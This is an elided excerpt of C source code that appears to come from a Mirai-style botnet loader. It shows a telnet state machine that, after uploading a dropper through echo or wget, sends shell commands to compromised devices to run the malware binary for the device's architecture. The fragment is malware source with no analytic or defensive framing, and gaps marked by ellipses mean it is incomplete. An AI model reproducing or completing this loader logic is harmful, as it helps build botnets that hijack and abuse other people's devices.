                ...
                switch(conn->state_telnet)
                {
                    ...
                    case TELNET_UPLOAD_ECHO:
                        ...
                        if(consumed)
                        {
                            ...
                            if(strncmp(conn->info.arch, "arc", 3) == 0)
                                util_sockprintf(conn->fd, "./%s telnet.%s; " EXEC_QUERY "\r\n", FN_DROPPER, conn->info.arch);
                            else
                                util_sockprintf(conn->fd, "./%s > %s; ./%s telnet.%s; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, FN_BINARY, conn->info.arch);
                    ...
                    case TELNET_UPLOAD_WGET:
                        ...
                        if(consumed > 0)
                        {
                            ...
                            #endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " telnet.%s; " EXEC_QUERY "\r\n", conn->info.arch);
